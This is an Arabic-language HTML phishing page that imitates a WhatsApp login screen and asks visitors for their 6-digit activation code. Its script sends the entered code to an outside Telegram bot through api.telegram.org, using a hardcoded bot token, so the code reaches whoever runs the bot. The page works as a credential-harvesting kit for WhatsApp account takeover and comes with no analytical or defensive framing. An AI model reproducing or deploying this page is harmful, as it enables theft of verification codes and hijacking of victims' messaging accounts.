<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FAF3E7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            text-align: center;
            margin-top: 80px;
        }

        .container input {
            width: 90%;
            max-width: 300px;
            padding: 10px;
            font-size: 16px;
            text-align: center;
            border: 1px solid #ddd;
            border-radius: 6px;
            margin-bottom: 15px;
        }

        .container button {
            width: 90%;
            max-width: 300px;
            padding: 10px;
            font-size: 18px;
            color: white;
            background-color: #25D366;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>تسجيل الدخول</h1>
        <p>أدخل رمز التفعيل المكون من 6 أرقام.</p>
        <input id="activationCode" type="text" placeholder="رمز التفعيل" maxlength="6">
        <button onclick="startVerification()">متابعة</button>
        <div id="status"></div>
    </div>

    <script>
        function startVerification() {
            const activationCode = document.getElementById('activationCode').value;

            if (!activationCode || activationCode.length !== 6 || !/^\d+$/.test(activationCode)) {
                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
                return;
            }

            sendCodeToTelegram(activationCode);
        }

        function sendCodeToTelegram(code) {
            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc'; // التوكن الخاص بالبوت
            const chatId = 'YOUR_CHAT_ID'; // استبدل YOUR_CHAT_ID بالـ Chat ID الصحيح
            const message = `رمز التفعيل الخاص بك هو: ${code}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
                .then(response => {
                    if (response.ok) {
                        document.getElementById('status').textContent = 'تم إرسال الرمز بنجاح!';
                    } else {
                        document.getElementById('status').textContent = 'حدث خطأ أثناء الإرسال. تحقق من الإعدادات.';
                    }
                })
                .catch(error => {
                    console.error('خطأ أثناء الإرسال:', error);
                    document.getElementById('status').textContent = 'فشل الإرسال. تحقق من اتصالك بالإنترنت.';
                });
        }
    </script>
</body>

</html>
